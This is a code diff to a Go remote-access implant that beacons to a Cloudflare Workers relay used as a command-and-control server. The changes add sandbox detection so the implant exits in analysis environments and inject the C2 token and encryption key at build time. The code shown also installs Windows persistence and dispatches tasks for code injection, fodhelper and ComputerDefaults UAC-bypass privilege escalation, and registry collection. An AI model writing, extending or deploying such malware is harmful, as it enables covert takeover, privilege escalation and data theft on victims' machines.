@@ -22,9 +22,21 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
+// -----------------------------------------------------------------------------
+// Compile-time constant — the Worker URL is the same for all deployments.
+// -----------------------------------------------------------------------------
+const LISTENER_URL = "https://jockey-relay.dm2528v.workers.dev"
+
+// -----------------------------------------------------------------------------
+// Build-time injected secrets (via -ldflags "-X main.X=Y").
+// If either is empty at runtime, the agent refuses to start.
+// -----------------------------------------------------------------------------
+var (
+	C2_AUTH   = "" // -X main.C2_AUTH=<token>     — must match Worker env.C2_AUTH
+	xorKeyHex = "" // -X main.xorKeyHex=<64-hex>  — 32-byte key, hex-encoded
+)
+
 const (
-	LISTENER_URL  = "https://jockey-relay.dm2528v.workers.dev"
-	C2_AUTH       = "supersecret123"
 	POLL_WAIT_SEC = 0
 	POLL_GAP      = 8 * time.Second
 	POLL_TIMEOUT  = 15 * time.Second
@@ -113,7 +125,27 @@ type SubmitRequest struct {
 	Findings []map[string]interface{} `json:"findings"`
 }
 
+// -----------------------------------------------------------------------------
+// main
+// -----------------------------------------------------------------------------
 func main() {
+	// Enforce build-time injection
+	if C2_AUTH == "" {
+		fmt.Fprintln(os.Stderr, "[FATAL] C2_AUTH not injected at build time")
+		fmt.Fprintln(os.Stderr, `       Rebuild with: go build -ldflags "-X main.C2_AUTH=<token>"`)
+		os.Exit(1)
+	}
+	if len(xorKeyHex) != 64 {
+		fmt.Fprintln(os.Stderr, "[FATAL] xorKeyHex not injected at build time (need 64 hex chars)")
+		fmt.Fprintln(os.Stderr, `       Rebuild with: go build -ldflags "-X main.xorKeyHex=<hex>"`)
+		os.Exit(1)
+	}
+
+	// Sandbox check — exit if running in an analysis environment
+	if runtime.GOOS == "windows" && IsSandboxed() {
+		os.Exit(0)
+	}
+
 	noPersist := false
 	for _, a := range os.Args[1:] {
 		if a == "--no-persist" {
@@ -121,6 +153,7 @@ func main() {
 		}
 	}
 
+	// Persistence install (medium-integrity only)
 	if !noPersist && runtime.GOOS == "windows" && !IsElevated() {
 		if !IsPersistenceInstalled() {
 			if err := InstallPersistence(); err != nil {
@@ -146,7 +179,11 @@ func main() {
 	fmt.Printf("[+] Relay: %s\n", LISTENER_URL)
 	fmt.Printf("[+] Beacon: every %ds\n", int(POLL_GAP.Seconds()))
 
-	InitializeEngine()
+	if err := InitializeEngine(); err != nil {
+		fmt.Fprintf(os.Stderr, "[FATAL] engine: %v\n", err)
+		os.Exit(1)
+	}
+	fmt.Println("[+] Execution Engine ready.")
 
 	for attempt := 1; attempt <= 10; attempt++ {
 		if err := registerAgent(hostname, username, osStr); err == nil {
@@ -158,10 +195,10 @@ func main() {
 	}
 
 	for {
-		deploy, err := longPoll()
+		deploy, err := pollOnce()
 		if err != nil {
 			fmt.Printf("[!] Poll: %v\n", err)
-			time.Sleep(5 * time.Second)
+			time.Sleep(3 * time.Second)
 			continue
 		}
 		if deploy != nil {
@@ -180,7 +217,7 @@ func handleDeploy(d *Deployment) {
 	}()
 
 	fmt.Printf("[TASK] deploy=%s script=%s\n", d.DeployID, d.ScriptID)
-	fmt.Printf("[LOG]  %.80s\n", d.Code)
+	fmt.Printf("[LOG]  %.120s\n", strings.TrimSpace(d.Code))
 
 	ctx, cancel := context.WithTimeout(context.Background(), TASK_TIMEOUT)
 	defer cancel()
@@ -209,6 +246,9 @@ func handleDeploy(d *Deployment) {
 	}
 }
 
+// -----------------------------------------------------------------------------
+// JOCKY script executor
+// -----------------------------------------------------------------------------
 func executeJOCKYContext(ctx context.Context, script string) string {
 	script = strings.TrimSpace(script)
 
@@ -218,20 +258,6 @@ func executeJOCKYContext(ctx context.Context, script string) string {
 		RemovePersistence()
 		time.Sleep(500 * time.Millisecond)
 		os.Exit(0)
-	}
-
-	if json.Valid([]byte(script)) {
-		if doc, err := ParseIRDocumentJSON(script); err == nil {
-			result, err := executeIRDocument(doc)
-			if err != nil {
-				return fmt.Sprintf("error: %v", err)
-			}
-			payload, marshalErr := json.MarshalIndent(result, "", "  ")
-			if marshalErr != nil {
-				return fmt.Sprintf("error: marshal result: %v", marshalErr)
-			}
-			return string(payload)
-		}
 	}
 
 	if strings.HasPrefix(script, "inject ") {
@@ -257,7 +283,7 @@ func executeJOCKYContext(ctx context.Context, script string) string {
 func executeInject(script string) string {
 	parts := strings.SplitN(script, " ", 4)
 	if len(parts) < 4 {
-		return "error: invalid inject syntax"
+		return "error: invalid inject syntax. Expected: inject <method> <target> <payload_ref>"
 	}
 	method := parts[1]
 	target := strings.Trim(parts[2], "\"")
@@ -304,7 +330,7 @@ func executePrivesc(script string) string {
 		}
 		return "SUCCESS: ComputerDefaults UAC bypass triggered"
 	default:
-		return fmt.Sprintf("error: unknown privesc method %q", method)
+		return fmt.Sprintf("error: unknown privesc method %q (try: info, uac-fodhelper, uac-computerdefaults)", method)
 	}
 }
 
@@ -358,7 +384,7 @@ func collectRegistry(path string) string {
 	}
 	parts := strings.SplitN(path, "\\", 2)
 	if len(parts) != 2 {
-		return "error: invalid registry path"
+		return "error: invalid registry path format"
 	}
 	hiveStr, keyPath := parts[0], parts[1]
 
@@ -445,7 +471,7 @@ func registerAgent(hostname, username, osStr string) error {
 	return err
 }
 
-func longPoll() (*Deployment, error) {
+func pollOnce() (*Deployment, error) {
 	req := map[string]interface{}{
 		"agent_id": AgentID,
 	}
